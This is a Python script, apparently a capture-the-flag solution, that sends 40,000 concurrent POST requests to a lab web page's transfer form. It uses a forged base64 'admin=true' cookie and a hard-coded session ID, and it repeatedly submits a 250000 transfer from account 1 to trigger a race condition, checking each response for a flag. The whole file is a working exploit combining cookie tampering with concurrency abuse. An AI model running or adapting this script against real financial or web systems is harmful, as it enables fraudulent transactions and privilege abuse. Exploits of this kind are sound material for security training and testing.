import asyncio
import aiohttp

# CONFIG
URL = "http://10.10.175.125/TASK13/index.php"
TOTAL_REQUESTS = 40000
BATCH_SIZE = 100

HEADERS = {
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-GB,en;q=0.9",
    "Origin": "http://10.10.175.125",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://10.10.175.125/TASK13/index.php",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

COOKIES = {
    "PHPSESSID": "ng7b8q34tuli6da9v5ees5nnfd",
    "admin": "dHJ1ZQ==",
}

# Sends a single request
async def send_request(session, request_id):
    data = {
        "account": "1",
        "amount": "250000"
    }
    try:
        async with session.post(URL, data=data, headers=HEADERS, cookies=COOKIES) as response:
            resp_text = await response.text()
            print(f"[{request_id}] Status: {response.status}, Length: {len(resp_text)}")
            # Optional: Check if response contains a flag
            if "flag{" in resp_text:
                print(f"[{request_id}] 🎯 FLAG FOUND:\n{resp_text}")
            return resp_text
    except Exception as e:
        print(f"[{request_id}] Error: {e}")
        return None

# Main runner
async def run():
    connector = aiohttp.TCPConnector(limit=BATCH_SIZE)
    timeout = aiohttp.ClientTimeout(total=60)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for batch_start in range(0, TOTAL_REQUESTS, BATCH_SIZE):
            batch_end = min(batch_start + BATCH_SIZE, TOTAL_REQUESTS)
            batch = [send_request(session, i) for i in range(batch_start, batch_end)]
            results = await asyncio.gather(*batch)
            print(f"Completed batch {batch_start} - {batch_end - 1}")

if __name__ == "__main__":
    asyncio.run(run())
